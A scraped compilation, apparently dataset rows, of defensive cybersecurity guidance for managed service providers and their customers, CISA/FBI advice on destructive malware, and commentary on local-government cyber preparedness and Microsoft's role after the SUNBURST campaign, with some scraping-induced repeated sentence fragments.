Prevent initial compromise.

In their efforts to compromise MSPs, malicious cyber actors exploit vulnerable devices and internet-facing services, conduct brute force attacks, and use phishing techniques. MSPs and their customers should ensure they are mitigating these attack methods. Useful mitigation resources on initial compromise attack methods are listed below:

Enable/improve monitoring and logging processes.

It can be months before incidents are detected, so UK, Australian, Canadian, New Zealand, and U.S. cybersecurity authorities recommend all organizations store their most important logs for at least six months. Whether through a comprehensive security information and event management (SIEM) solution or discrete logging tools, implement and maintain a segregated logging regime to detect threats to networks. Organizations can refer to the following NCSC-UK guidance on the appropriate data to collect for security purposes and when to use it: What exactly should we be logging? Additionally, all organizations—whether through contractual arrangements with an MSP or on their own—should implement endpoint detection and network defense monitoring capabilities in addition to using application allowlisting/denylisting.

MSPs should log the delivery infrastructure activities used to provide services to the customer. MSPs should also log both internal and customer network activity, as appropriate and contractually agreed upon.

should log the delivery infrastructure activities used to provide services to the customer. MSPs should also log both internal and customer network activity, as appropriate and contractually agreed upon. Customers should enable effective monitoring and logging of their systems. If customers choose to engage an MSP to perform monitoring and logging, they should ensure that their contractual arrangements require their MSP to: Implement comprehensive security event management that enables appropriate monitoring and logging of provider-managed customer systems; Provide visibility—as specified in the contractual arrangement—to customers of logging activities, including provider's presence, activities, and connections to the customer networks ( Note: customers should ensure that MSP accounts are properly monitored and audited.); and Notify customer of confirmed or suspected security events and incidents occurring on the provider’s infrastructure and administrative networks, and send these to a security operations center (SOC) for analysis and triage.

should enable effective monitoring and logging of their systems. If customers choose to engage an MSP to perform monitoring and logging, they should ensure that their contractual arrangements require their MSP to:

Enforce multifactor authentication (MFA).

Organizations should secure remote access applications and enforce MFA where possible to harden the infrastructure that enables access to networks and systems.[9],[10] Note: Russian state-sponsored APT actors have recently demonstrated the ability to exploit default MFA protocols; organizations should review configuration policies to protect against “fail open” and re-enrollment scenarios.[11]

MSPs should recommend the adoption of MFA across all customer services and products. Note: MSPs should also implement MFA on all accounts that have access to customer environments and should treat those accounts as privileged.

should recommend the adoption of MFA across all customer services and products. MSPs should also implement MFA on all accounts that have access to customer environments and should treat those accounts as privileged. Customers should ensure that their contractual arrangements mandate the use of MFA on the services and products they receive. Contracts should also require MFA to be enforced on all MSP accounts used to access customer environments.

Manage internal architecture risks and segregate internal networks.

Organizations should understand their environment and segregate their networks. Identify, group, and isolate critical business systems and apply appropriate network security controls to them to reduce the impact of a compromise across the organization.[12],[13]

MSPs should review and verify all connections between internal systems, customer systems, and other networks. Segregate customer data sets (and services, where applicable) from each other—as well as from internal company networks—to limit the impact of a single vector of attack. Do not reuse admin credentials across multiple customers.

should review and verify all connections between internal systems, customer systems, and other networks. Segregate customer data sets (and services, where applicable) from each other—as well as from internal company networks—to limit the impact of a single vector of attack. Do not reuse admin credentials across multiple customers. Customers should review and verify all connections between internal systems, MSP systems, and other networks. Ensure management of identity providers and trusts between the different environments. Use a dedicated virtual private network (VPN) or alternative secure access method, to connect to MSP infrastructure and limit all network traffic to and from the MSP to that dedicated secure connection. Verify that the networks used for trust relationships with MSPs are suitably segregated from the rest of their networks. Ensure contractual agreements specify that MSPs will not reuse admin credentials across multiple customers.

Apply the principle of least privilege.

Organizations should apply the principle of least privilege throughout their network environment and immediate update privileges upon changes in administrative roles. Use a tiering model for administrative accounts so that these accounts do not have any unnecessary access or privileges. Only use accounts with full privileges across an enterprise when strictly necessary and consider the use of time-based privileges to further restrict their use. Identify high-risk devices, services and users to minimize their accesses.[14]

MSPs should apply this principle to both internal and customer environments, avoiding default administrative privileges.

should apply this principle to both internal and customer environments, avoiding default administrative privileges. Customers should ensure that their MSP applies this principle to both provider and customer network environments. Note: customers with contractual arrangements that provide them with administration of MSP accounts within their environment should ensure that the MSP accounts only have access to the services/resources being managed by the MSP.

Deprecate obsolete accounts and infrastructure.

Both MSPs and customers should periodically review their internet attack surface and take steps to limit it, such as disabling user accounts when personnel transition.[15] (Note: although sharing accounts is not recommended, should an organization require this, passwords to shared account should be reset when personnel transition.) Organizations should also audit their network infrastructure—paying particular attention to those on the MSP-customer boundary—to identify and disable unused systems and services. Port scanning tools and automated system inventories can assist organizations in confirming the roles and responsibilities of systems.

Customers should be sure to disable MSP accounts that are no longer managing infrastructure. Note: disabling MSP accounts can be overlooked when a contract terminates.

Apply updates.

Organizations should update software, including operating systems, applications, and firmware. Prioritize applying security updates to software containing known exploited vulnerabilities. Note: organizations should prioritize patching vulnerabilities included in CISA’s catalogue of known exploited vulnerabilities (KEV) as opposed to only those with high Common Vulnerability Scoring System (CVSS) scores that have not been exploited and may never be exploited.[16],[17],[18],[19]

MSPs should implement updates on internal networks as quickly as possible.

should implement updates on internal networks as quickly as possible. Customers should ensure that they understand their MSP's policy on software updates and request that comprehensive and timely updates are delivered as an ongoing service.

Backup systems and data.

Organizations should regularly update and test backups—including “gold images” of critical systems in the event these need to be rebuilt (Note: organizations should base the frequency of backups on their recovery point objective [20]). Store backups separately and isolate them from network connections that could enable the spread of ransomware; many ransomware variants attempt to find and encrypt/delete accessible backups. Isolating backups enables restoration of systems/data to their previous state should they be encrypted with ransomware. Note: best practices include storing backups separately, such as on external media.[21],[22],[23]

MSPs should regularly backup internal data as well as customer data (where contractually appropriate) and maintain offline backups encrypted with separate, offline encryption keys. Providers should encourage customers to create secure, offsite backups and exercise recovery capabilities.

should regularly backup internal data as well as customer data (where contractually appropriate) and maintain offline backups encrypted with separate, offline encryption keys. Providers should encourage customers to create secure, offsite backups and exercise recovery capabilities. Customers should ensure that their contractual arrangements include backup services that meet their resilience and disaster recovery requirements. Specifically, customers should require their MSP to implement a backup solution that automatically and continuously backs up critical data and system configurations and store backups in an easily retrievable location, e.g., a cloud-based solution or a location that is air-gapped from the organizational network.

Develop and exercise incident response and recovery plans.

Incident response and recovery plans should include roles and responsibilities for all organizational stakeholders, including executives, technical leads, and procurement officers. Organizations should maintain up-to-date hard copies of plans to ensure responders can access them should the network be inaccessible (e.g., due to a ransomware attack).[24]

MSPs should develop and regularly exercise internal incident response and recovery plans and encourage customers to do the same.

should develop and regularly exercise internal incident response and recovery plans and encourage customers to do the same. Customers should ensure that their contractual arrangements include incident response and recovery plans that meet their resilience and disaster recovery requirements. Customers should ensure these plans are tested at regular intervals.

Understand and proactively manage supply chain risk.

All organizations should proactively manage ICT supply chain risk across security, legal, and procurement groups, using risk assessments to identify and prioritize the allocation of resources.[25],[26]

MSPs should understand their own supply chain risk and manage the cascading risks it poses to customers.

should understand their own supply chain risk and manage the cascading risks it poses to customers. Customers should understand the supply chain risk associated with their MSP, including risk associated with third-party vendors or subcontractors. Customers should also set clear network security expectations with their MSPs and understand the access their MSP has to their network and the data it houses. Each customer should ensure their contractual arrangements meet their specific security requirements and that their contract specifies whether the MSP or the customer owns specific responsibilities, such as hardening, detection, and incident response.[27]

Promote transparency.

Both MSPs and their customers will benefit from contractual arrangements that clearly define responsibilities.

MSPs , when negotiating the terms of a contract with their customer, should provide clear explanations of the services the customer is purchasing, services the customer is not purchasing, and all contingencies for incident response and recovery.

, when negotiating the terms of a contract with their customer, should provide clear explanations of the services the customer is purchasing, services the customer is not purchasing, and all contingencies for incident response and recovery. Customers should ensure that they have a thorough understanding of the security services their MSP is providing via the contractual arrangement and address any security requirements that fall outside the scope of the contract. Note: contracts should detail how and when MSPs notify the customer of an incident affecting the customer's environment.

Manage account authentication and authorization.

All organizations should adhere to best practices for password and permission management. [28],[29],[30] Organizations should review logs for unexplained failed authentication attempts—failed authentication attempts directly following an account password change could indicate that the account had been compromised. Note: network defenders can proactively search for such ""intrusion canaries"" by reviewing logs after performing password changes—using off-network communications to inform users of the changes—across all sensitive accounts. (See the ACSC publication, Windows Event Logging and Forwarding as well as Microsoft's documentation, 4625(F): An account failed to log on, for additional guidance.)

MSPs should verify that the customer restricts MSP account access to systems managed by the MSP.

should verify that the customer restricts MSP account access to systems managed by the MSP. Customers should ensure MSP accounts are not assigned to internal administrator groups; instead, restrict MSP accounts to systems managed by the MSP. Grant access and administrative permissions on a need-to-know basis, using the principle of least privilege. Verify, via audits, that MSP accounts are being used for appropriate purposes and activities, and that these accounts are disabled when not actively being used.

Mitigations

Best Practices for Handling Destructive Malware As previously noted above, destructive malware can present a direct threat to an organization’s daily operations, impacting the availability of critical assets and data. Organizations should increase vigilance and evaluate their capabilities, encompassing planning, preparation, detection, and response, for such an event. This section is focused on the threat of malware using enterprise-scale distributed propagation methods and provides recommended guidance and considerations for an organization to address as part of their network architecture, security baseline, continuous monitoring, and incident response practices. CISA and the FBI urge all organizations to implement the following recommendations to increase their cyber resilience against this threat. Potential Distribution Vectors Destructive malware may use popular communication tools to spread, including worms sent through email and instant messages, Trojan horses dropped from websites, and virus-infected files downloaded from peer-to-peer connections. Malware seeks to exploit existing vulnerabilities on systems for quiet and easy access. The malware has the capability to target a large scope of systems and can execute across multiple systems throughout a network. As a result, it is important for organizations to assess their environment for atypical channels for malware delivery and/or propagation throughout their systems. Systems to assess include: Enterprise applications – particularly those that have the capability to directly interface with and impact multiple hosts and endpoints. Common examples include: Patch management systems, Asset management systems, Remote assistance software (typically used by the corporate help desk), Antivirus (AV) software, Systems assigned to system and network administrative personnel, Centralized backup servers, and Centralized file shares.

While not only applicable to malware, threat actors could compromise additional resources to impact the availability of critical data and applications. Common examples include: Centralized storage devices Potential risk – direct access to partitions and data warehouses.

Network devices Potential risk – capability to inject false routes within the routing table, delete specific routes from the routing table, remove/modify, configuration attributes, or destroy firmware or system binaries—which could isolate or degrade availability of critical network resources.

Best Practices and Planning Strategies Common strategies can be followed to strengthen an organization’s resilience against destructive malware. Targeted assessment and enforcement of best practices should be employed for enterprise components susceptible to destructive malware. Communication Flow Ensure proper network segmentation.

Ensure that network-based access control lists (ACLs) are configured to permit server-to-host and host-to-host connectivity via the minimum scope of ports and protocols and that directional flows for connectivity are represented appropriately. Communications flow paths should be fully defined, documented, and authorized.

Increase awareness of systems that can be used as a gateway to pivot (lateral movement) or directly connect to additional endpoints throughout the enterprise. Ensure that these systems are contained within restrictive Virtual Local Area Networks (VLANs), with additional segmentation and network access controls.

Ensure that centralized network and storage devices’ management interfaces reside on restrictive VLANs. Layered access control, and Device-level access control enforcement – restricting access from only pre-defined VLANs and trusted IP ranges.

Access Control For enterprise systems that can directly interface with multiple endpoints: Require multifactor authentication for interactive logons. Ensure that authorized users are mapped to a specific subset of enterprise personnel. If possible, the “Everyone,” “Domain Users,” or the “Authenticated Users” groups should not be permitted the capability to directly access or authenticate to these systems. Ensure that unique domain accounts are used and documented for each enterprise application service. Context of permissions assigned to these accounts should be fully documented and configured based upon the concept of least privilege. Provides an enterprise with the capability to track and monitor specific actions correlating to an application’s assigned service account. If possible, do not grant a service account with local or interactive logon permissions. Service accounts should be explicitly denied permissions to access network shares and critical data locations. Accounts that are used to authenticate to centralized enterprise application servers or devices should not contain elevated permissions on downstream systems and resources throughout the enterprise.

Continuously review centralized file share ACLs and assigned permissions. Restrict Write/Modify/Full Control permissions when possible.

Monitoring Audit and review security logs for anomalous references to enterprise-level administrative (privileged) and service accounts. Failed logon attempts, File share access, and Interactive logons via a remote session.

Review network flow data for signs of anomalous activity, including: Connections using ports that do not correlate to the standard communications flow associated with an application, Activity correlating to port scanning or enumeration, and Repeated connections using ports that can be used for command and control purposes.

Ensure that network devices log and audit all configuration changes. Continually review network device configurations and rule sets to ensure that communications flows are restricted to the authorized subset of rules.

File Distribution When deploying patches or AV signatures throughout an enterprise, stage the distributions to include a specific grouping of systems (staggered over a pre-defined period). This action can minimize the overall impact in the event that an enterprise patch management or AV system is leveraged as a distribution vector for a malicious payload.

Monitor and assess the integrity of patches and AV signatures that are distributed throughout the enterprise. Ensure updates are received only from trusted sources, Perform file and data integrity checks, and Monitor and audit – as related to the data that is distributed from an enterprise application.

System and Application Hardening Ensure robust vulnerability management and patching practices are in place. CISA maintains a living catalog of known exploited vulnerabilities that carry significant risk to federal agencies as well as public and private sectors entities. In addition to thoroughly testing and implementing vendor patches in a timely—and, if possible, automated— manner, organizations should ensure patching of the vulnerabilities CISA includes in this catalog.

Ensure that the underlying operating system (OS) and dependencies (e.g., Internet Information Services [IIS], Apache, Structured Query Language [SQL]) supporting an application are configured and hardened based upon industry-standard best practice recommendations. Implement application-level security controls based on best practice guidance provided by the vendor. Common recommendations include: Use role-based access control, Prevent end-user capabilities to bypass application-level security controls, For example, do not allow users to disable AV on local workstations. Remove, or disable unnecessary or unused features or packages, and Implement robust application logging and auditing.

Recovery and Reconstitution Planning A business impact analysis (BIA) is a key component of contingency planning and preparation. The overall output of a BIA will provide an organization with two key components (as related to critical mission/business operations): Characterization and classification of system components, and

Interdependencies. Based upon the identification of an organization’s mission critical assets (and their associated interdependencies), in the event that an organization is impacted by destructive malware, recovery and reconstitution efforts should be considered. To plan for this scenario, an organization should address the availability and accessibility for the following resources (and should include the scope of these items within incident response exercises and scenarios): Comprehensive inventory of all mission critical systems and applications: Versioning information, System/application dependencies, System partitioning/storage configuration and connectivity, and Asset owners/points of contact.

Contact information for all essential personnel within the organization,

Secure communications channel for recovery teams,

Contact information for external organizational-dependent resources: Communication providers, Vendors (hardware/software), and Outreach partners/external stakeholders

Service contract numbers – for engaging vendor support,

Organizational procurement points of contact,

Optical disc image (ISO)/image files for baseline restoration of critical systems and applications: OS installation media, Service packs/patches, Firmware, and Application software installation packages.

Licensing/activation keys for OS and dependent applications,

Enterprise network topology and architecture diagrams,

System and application documentation,

Hard copies of operational checklists and playbooks,

System and application configuration backup files,

Data backup files (full/differential),

System and application security baseline and hardening checklists/guidelines, and

System and application integrity test and acceptance checklists. Incident Response Victims of a destructive malware attacks should immediately focus on containment to reduce the scope of affected systems. Strategies for containment include: Determining a vector common to all systems experiencing anomalous behavior (or having been rendered unavailable)—from which a malicious payload could have been delivered: Centralized enterprise application, Centralized file share (for which the identified systems were mapped or had access), Privileged user account common to the identified systems, Network segment or boundary, and Common Domain Name System (DNS) server for name resolution.

Based upon the determination of a likely distribution vector, additional mitigation controls can be enforced to further minimize impact: Implement network-based ACLs to deny the identified application(s) the capability to directly communicate with additional systems, Provides an immediate capability to isolate and sandbox specific systems or resources. Implement null network routes for specific IP addresses (or IP ranges) from which the payload may be distributed, An organization’s internal DNS can also be leveraged for this task, as a null pointer record could be added within a DNS zone for an identified server or application. Readily disable access for suspected user or service account(s), For suspect file shares (which may be hosting the infection vector), remove access or disable the share path from being accessed by additional systems, and Be prepared to, if necessary, reset all passwords and tickets within directories (e.g., changing golden/silver tickets).

As related to incident response and incident handling, organizations are encouraged to report incidents to the FBI and CISA (see the Contact section below) and to preserve forensic data for use in internal investigation of the incident or for possible law enforcement purposes. See Technical Approaches to Uncovering and Remediating Malicious Activity for more information.

According to a report from security firm Trend Micro, based on a survey of 5,000 IT and business decision-makers, just under half (42 percent) of companies are spending most of their IT budget on risk mitigation.

At the same time, C-suite engagement with cybersecurity topics is “critically low”. The report found that just above half (57 percent) of IT teams discuss cyber risks with the C-suite at least once a week.

What’s more, companies are investing less in digital transformation and workforce transformation compared to cyber-risk mitigation, an approach that “may undermine more effective strategies and risk greater financial loss”, the report states.

Less than half of the respondents (46 percent) were familiar with concepts such as “cyber risk management”, it was said. But the vast majority (77 percent) would love to see more people in the organization responsible for the management and mitigation of cybersecurity risks.

“Vulnerabilities used to go months or even years before being exploited after their discovery. Now it can be hours, or even sooner,” said Eva Chen, CEO of Trend Micro.

“More executives than ever understand that they have a responsibility to be informed, but they often feel overwhelmed by how rapidly the cybersecurity landscape evolves.

Getting the Basics Right

President Joe Biden on March 21, 2022, warned that Russian cyberattacks on U.S. targets are likely , though the government has not identified a specific threat. Biden urged the private sector: “Harden your cyber defenses immediately.”It is a costly fact of modern life that organizations from pipelines and shipping companies to hospitals and any number of private companies are vulnerable to cyberattacks, and the threat of cyberattacks from Russia and other nations makes a bad situation worse. Individuals, too, are at risk from the current threat.Local governments, like schools and hospitals, are particularly enticing “soft targets ” – organizations that lack the resources to defend themselves against routine cyberattacks, let alone a lengthy cyber conflict. For those attacking such targets, the goal is not necessarily financial reward but disrupting society at the local level.From issuing business licenses and building permits and collecting taxes to providing emergency services, clean water and waste disposal, the services provided by local governments entail an intimate and ongoing daily relationship with citizens and businesses alike. Disrupting their operations disrupts the heart of U.S. society by shaking confidence in local government and potentially endangering citizens.Local governments have suffered successful cyberattacks in recent years. These include attacks on targets ranging from 911 call centers to public school systems . The consequences of a successful cyberattack against local government can be devastating I and other researchers at University of Maryland, Baltimore County have studied the cybersecurity preparedness of the United States’ over 90,000 local government entities . As part of our analysis, working with the International City/County Management Association , we polled local government chief security officers about their cybersecurity preparedness. The results are both expected and alarming.Among other things, the survey revealed that nearly one-third of U.S. local governments would be unable to tell if they were under attack in cyberspace. This is unsettling; nearly one-third of local governments that did know whether they were under attack reported being attacked hourly, and nearly half at least daily.Lack of sound IT practices, let alone effective cybersecurity measures, can make successful cyberattacks even more debilitating. Almost half of U.S. local governments reported that their IT policies and procedures were not in line with industry best practices.In many ways, local governments are no different from private companies in terms of the cybersecurity threats, vulnerabilities and management problems they face. In addition to those shared cybersecurity challenges, where local governments particularly struggle is in hiring and retaining the necessary numbers of qualified IT and cybersecurity staff with wages and workplace cultures that can compare with those of the private sector or federal government.Additionally, unlike private companies, local governments by their nature are limited by the need to comply with state policies, the political considerations of elected officials and the usual perils of government bureaucracy such as balancing public safety with the community’s needs and corporate interests. Challenges like these can hamper effective preparation for, and responses to, cybersecurity problems – especially when it comes to funding. In addition, much of the technology local communities rely on, such as power and water distribution, are subject to the dictates of the private sector, which has its own set of sometimes competing interests.Large local governments are better positioned to address cybersecurity concerns than smaller local governments. Unfortunately, like other soft targets in cyberspace, small local governments are much more constrained. This places them at greater risk of successful cyberattacks, including attacks that otherwise might have been prevented . But the necessary, best-practice cybersecurity improvements that smaller cities and towns need often compete with the many other demands on a local community’s limited funds and staff attention.Whether they are victimized by a war on the other side of the world, a hacktivist group promoting its message or a criminal group trying to extort payment, local governments in the U.S. are enticing targets. Artificial intelligence hacking tools and vulnerabilities introduced by the spread of smart devices and the growing interest in creating “ smart cities ” put local governments even more at risk.There’s no quick or foolproof fix to eliminate all cybersecurity problems, but one of the most important steps local governments can take is clear: Implement basic cybersecurity. Emulating the National Institute of Standards and Technology’s national cybersecurity framework or other industry accepted best practices is a good start.I believe government officials, especially at the local level, should develop and apply the necessary resources and innovative technologies and practices to manage their cybersecurity risks effectively. Otherwise, they should be prepared to face the technical, financial and political consequences of failing to do so.",Cybersecurity Failure,2022-03-29 07:00:00

From this perspective, Microsoft’s offer last year of free access for federal agencies to logging tools for one year feels a bit like a jam.","On Feb. 1, Microsoft announced a new cybersecurity offering for federal government customers called the Modern Log Management Program. The program includes a suite of Microsoft’s visibility and remediation tools, which pull diagnostic data from various Microsoft products so that customers gain more insight into what’s happening on their networks. The goal of the program, according to Microsoft, is to help executive branch agencies meet new cybersecurity event logging requirements issued by the Office of Management and Budget (OMB) in August 2021 in a memorandum known as M-21-31. Microsoft has pledged to offer the program at a discounted price to help agencies “mitigate budget challenges from an increase in log source and log storage requirements required by M-21-31.”

This offer sounds almost charitable on Microsoft’s part, but a closer look at the circumstances that gave rise to M-21-31—and Microsoft’s unique place in federal information technology (IT)—highlights how Microsoft simultaneously combats, profits from and contributes to cybersecurity problems.

OMB introduces the requirements laid out in M-21-31 by observing that “[r]ecent events, including the SolarWinds incident, underscore the importance of increased government visibility before, during, and after a cybersecurity incident.” The SolarWinds incident came to light in December 2020 when the cybersecurity company formerly known as FireEye announced its discovery of a Russian cyber-espionage campaign that would become popularly (though misleadingly) known as SolarWinds, which is the name of the software vendor behind a popular network monitoring product called Orion. Russian government hackers had infiltrated the vendor’s software development environment at some point in 2019 and installed malicious code in a software update—a type of attack known as a supply chain operation. When SolarWinds’s customers installed the update, the malicious code hidden within gave the Russian hackers a foothold for burrowing deeper inside SolarWind’s customers’ networks to steal secrets.

The campaign—which is known less popularly by the company-neutral monikers Nobelium and SUNBURST—is viewed by many observers as one of the most significant cyber incidents to date because it involved a supply chain operation and required significant planning and patience on the adversary’s part. And it impacted a range of victims: federal agencies, state and local governments, universities, and a large swath of the Fortune 500, including Cisco, Intel and Microsoft.

SUNBURST—the term I’ll use here for the campaign—must have produced an intelligence bonanza for the Russian government. And the threat actors have not let up: They continue to adapt their tradecraft to evade detection and carry out further attacks.

Despite the focus on SolarWinds as the main door the attackers entered, Microsoft is a common thread across many victims of the SUNBURST campaign. Once inside a victim’s network courtesy of Orion, the SUNBURST attackers often exploited known loopholes in how Microsoft’s cloud product, Microsoft 365, was configured. This allowed the attackers to expand their access to a victim’s IT environment, including the victim’s cloud accounts, and to hide their tracks.

For the roughly one-third of SUNBURST victims who did not use Orion but still got hacked, the attackers found different ways in, but once inside, they abused the same configuration loopholes in Microsoft 365 to burrow deeper and move laterally within the victim’s networks. Researchers from the Atlantic Council performed a comprehensive review of the SUNBURST campaign and concluded that “[i]t is this lateral movement into the cloud, and the effective abuse of Microsoft’s identity services, that distinguishes an otherwise large software supply chain attack from a widespread intelligence coup” for Russia.

Since the news of SUNBURST broke one year ago, the two companies have fared differently: SolarWinds has suffered while Microsoft has thrived. SolarWinds—whose internal cybersecurity practices have understandably come under fire and are the subject of litigation—has paid a heavy price for its role in the incident. Its product, Orion, was the attacker’s way in for an estimated 70 percent of the campaign’s victims. The company’s name has become synonymous with a Russian hacking campaign, and its competitors have seized the opportunity to market their products as a safe, easy-to-switch-to alternative. “Organizations can now get up and running today with no delay, no [capital expenditures], and no new expertise,” boasts one competitor about its alternative offering. SolarWinds has disclosed a running tally of nearly $40 million in expenses from the incident and continues to warn investors that the incident “is expected to negatively impact revenue, profitability and cash flows in 2021 and beyond.” Its stock price is down more than 40 percent since this time last year, notwithstanding a two-to-one reverse stock split and a special dividend in July.

Microsoft, by contrast, has fared much better. Its stock price is the mirror image of SolarWinds’s stock price, up well over 40 percent this year. And it experienced 22 percent year-over-year revenue growth, its fastest since 2018.

Despite these financial gains, 2021 was overall a very tough year in security for Microsoft.

First, there was the disclosure in March 2021 of what cybersecurity analyst Brian Krebs dubbed the “mass-hack” of zero-day vulnerabilities (that is, vulnerabilities that were previously unknown) in Microsoft Exchange Servers that adversaries could exploit remotely, with no user action. China and apparently other governments discovered and exploited the vulnerability months before Microsoft’s public disclosure and subsequent issuance of a patch. Within days of Microsoft’s disclosure, the victim count exceeded 60,000. A week later, Microsoft issued an update to fix 82 security problems in Windows, 10 of which the company deemed “critical” (including a particularly dangerous one involving Internet Explorer).

In June 2021, the company issued patches for six more zero-days that adversaries had already discovered and exploited. In July, it issued emergency updates to fix PrintNightmare, a vulnerability in the Windows Print Spooler service that could enable an adversary to take full control of a vulnerable system. The streak continued into August when one team of researchers announced the discovery of a design flaw in Microsoft Exchange Autodiscover that attackers could exploit to harvest Windows domain credentials and another team of researchers discovered a vulnerability that they exploited to achieve “complete unrestricted access to the accounts and databases of several thousand Microsoft Azure customers.”

September 2021 was especially tough. It began with Microsoft announcing the discovery of another remote code execution vulnerability, this time affecting MSHTML, a software component in Internet Explorer and Microsoft Office. The following week, it issued patches for three more zero-day vulnerabilities with the dreaded “critical” rating, meaning that adversaries could exploit them to compromise vulnerable systems. Later in the month, researchers discovered malware called FoggyWeb that the SUNBURST threat actors were installing on systems they had already compromised to steal configuration databases and security token certificates.

In October 2021, Microsoft said that it had informed more than 140 third-party resellers and service providers of Microsoft products that SUNBURST threat actors had targeted them. It also disclosed that 14 of them had been compromised as of October 2021.

To be sure, 2021 was a rough year for cybersecurity generally. Data compromises were way up, having already surpassed 2020 levels by September, according to one study. So were ransomware attacks. And 2021 also shattered the record for zero-day vulnerabilities, discovered only after being exploited in actual attacks “in the wild”—58 so far, which is double the number discovered in 2020. Microsoft products account for 21 of the zero-days—the most—but the list is peppered with entries involving products from Apple, Google and others too.

Indeed, a sizable chunk of SolarWinds’s customers appear willing to give the company a second chance—its customers have not defected en masse to providers of comparable services, according to data from the company’s 10-Q filing. In February 2021, months after discovering the SUNBURST campaign, SolarWinds CEO Sudhakar Ramakrishna told investors that “[t]he vast majority of the customers that I have spoken to understand that the cyber incident that affected us and others could have happened to any vendor, and especially a broadly deployed vendor like SolarWinds.”

If SolarWinds suffered a second incident, however, customers might not be so quick to forgive. Most digital products could disappear tomorrow, and the world would move on. When Facebook and its family of apps suffered an outage in October, for example, more than 3 billion people lost a means of communication. It inconvenienced many, but it was hardly Armageddon—other means of communication were unaffected. Similarly, organizations could disable Orion and then choose to either cancel their service (which some did after December 2020) or resume use after installing the security patch (which others, including the federal government, opted to do).

SolarWinds’s customers have a meaningful choice: forgive or cancel.

Microsoft is in a much different—and arguably, far stronger—competitive position vis-a-vis its customers. For organizations whose IT infrastructure is built on Microsoft products, switching to a different vendor for all or even part of this infrastructure can be an enormously complex, potentially disruptive and ultimately expensive endeavor. If customers face barriers to canceling a product—because switching is too costly or there aren’t practical alternatives—the vendor has leverage to transfer more risk to them. The customers are partially “locked-in.”

There is no question that Microsoft security personnel worked especially hard in 2021—nobody should question their commitment to protecting users from malicious activities. And in August 2021, the company announced additional support for federal cybersecurity at a White House summit with other tech giants—a welcome development as well.

But as John Pescatore, director of emerging security trends at the SANS Institute, put it in response to Microsoft’s security initiatives, “It is kind of like if Tesla formed a Digital Crimes Unit to shut down thieves that were stealing Tesla cars because the Tesla door locks didn’t work.” To extend the analogy further, imagine if canceling Tesla for a different automaker was formidable because the very act of switching was costly: Some customers may have little choice but to accept the heightened risk of theft, even if cost-effective alternatives are available. Customer lock-in is the dark side of the “winner take all” network effects that characterize parts of the marketplace for software. And it is bad for cybersecurity.

The intuition behind network effects is that the value of something to a user increases the more that others use it. Think about a collaboration platform: It isn’t very useful to a single user. As more and more people use it, however, its value to each user grows, which in turn draws even more users.

This dynamic tends to favor the emergence of a limited number of dominant providers. It also puts pressure on firms to capture market share quickly in the hopes of generating network effects that propel it to dominance. In the software industry, this rush to market gave rise to the quip “ship Monday, patch Tuesday”: better to get an insecure product with attractive features out quickly to capture and protect market share than to delay a launch to add more security, which customers may not value as much.

Network effects can make it hard for users to switch providers. For example, if part of the value that a customer derives from a product is that others use it too, switching to an alternative product could be an all-or-nothing proposition: It may only make sense to switch if the entire organization also takes the plunge. The costs and risks of switching can be substantial, however, and include costs that go well beyond the price of purchasing the alternative product: substantial investments of staff time to implement the switch, drops in productivity as users familiarize themselves with the new product, hits to morale if some users are unhappy about the switch, training for users and IT support staff, business disruptions if the switch doesn’t go as smoothly as planned. It’s a daunting list.

Consider the federal government. Microsoft’s Windows operating system is ubiquitous across the federal government, and its market share for office productivity among federal agencies is 85 percent, according to a recent study prepared by Omdia, a consultancy, for Google and a trade association. In a follow-up study, Omdia reported results from a survey of public-sector technology decision-makers. “The top reason cited by respondents (57%) for selecting a communication and collaboration partner was reducing work for their IT departments.” On the one hand, there is significant value in a product that reduces work for IT departments, even if other factors are relevant too (such as price and product performance).

On the other hand, if an IT department has organized its business processes around certain products—as the federal government has largely done for operating systems and productivity—and changing those processes is costly, the vendor has achieved some degree of lock-in. Inertia favors the incumbent and makes change difficult, even after events reveal risks in the status quo.

Some of Microsoft’s business practices over the past year raise eyebrows along these lines. For example, at first, Microsoft planned to charge the federal government for rather basic security features such as event logging in Microsoft 365 in response to the SUNBURST campaign, which exploited loopholes in Microsoft products. Such behavior is not consistent with how a company facing competitive pressures might be expected to act, especially after a rough year for security, like 2021. It later offered the federal government a free one-year subscription to these services, but only after lawmakers complained about the initial price tag and pointed out the irony of Microsoft charging customers a premium for services that help defend against shortcomings in Microsoft software.

More recently, Microsoft reportedly informed its business partners that the company plans in 2022 to roll out a 20 percent increase in the price of Office, its flagship line of productivity apps, for business customers unless they switch from a monthly subscription to an annual one. CNBC reporter Jordan Novet described the move as an example of Microsoft “using its market dominance in productivity software to force some customers of its Office suite into a big decision: pay more or commit to a longer subscription.” The company had previously announced substantial price increases for Microsoft 365.

There is nothing inappropriate, per se, about Microsoft driving a hard bargain for access to its products. But there is more to driving a hard bargain than just price—it extends to which features, including security features, are included at a given price point, from the default basic configuration to more premium offerings. If a vendor has leverage to charge more for security, it has a strong incentive to establish pricing tiers that allow it to upsell, with lower and less expensive tiers having weaker security attributes than higher, pricier tiers. Microsoft has a $15 billion security business that depends in part on its being able to upsell security services for its own products—which is exactly what Microsoft attempted to do to the federal government after the SUNBURST campaign came to light.

The fundamental question here is whether it is desirable or even possible that certain basic security features should be considered as “standard,” in the sense that a vendor must offer them or face a backlash from customers or regulators. There is obviously a demand (or lack thereof) problem at play: It is baffling that the federal government, or really any enterprise, would not have event-logging capabilities appropriate to its risk environment.

Microsoft’s grip on legacy IT in many organizations—including federal agencies—gives it a degree of negotiating power that complicates an otherwise easy jump to blaming users for not demanding more security from product vendors. From this perspective, Microsoft’s offer last year of free access for federal agencies to logging tools for one year feels a bit like a jam. Agencies are hard-pressed to say no to the offer, and then once they’ve accepted the free services, there’s no going back, even if Microsoft eventually converts the free services to a discounted (as in, no longer free) offering—as it seems to have done with its Modern Log Management Program.",Cybersecurity Failure,2022-03-07 08:00:00

Many IT professionals either have work experience or military service, as opposed to undergraduate education in computer science or information technology.","Ted G. Lewis, a professor at the Naval Postgraduate School, states in his book Critical Infrastructure Protection in Homeland Security: Defending a Networked Nation, “trusted computing depends on human processes as much, if not more, than on technology.” This is a statement that many cybersecurity leaders could get behind.

Obviously, a technology is only as secure as are the people that work in it. In many ways, a cybersecurity failure can be likened to a counterintelligence (CI) failure in that both deal with sensitive material either from a technical or human intelligence discipline, yet are based upon human failings rather than an unsecured firewall or an unlocked fence. However, technical infrastructures are integral to the effective and proper functioning of a nation-state, specifically the United States. IT assets are responsible for how nations communicate; deal in stocks and the financial market; and operate governments. Because of cyberspace’s importance in public and private life, it is imperative that it be protected against threats.

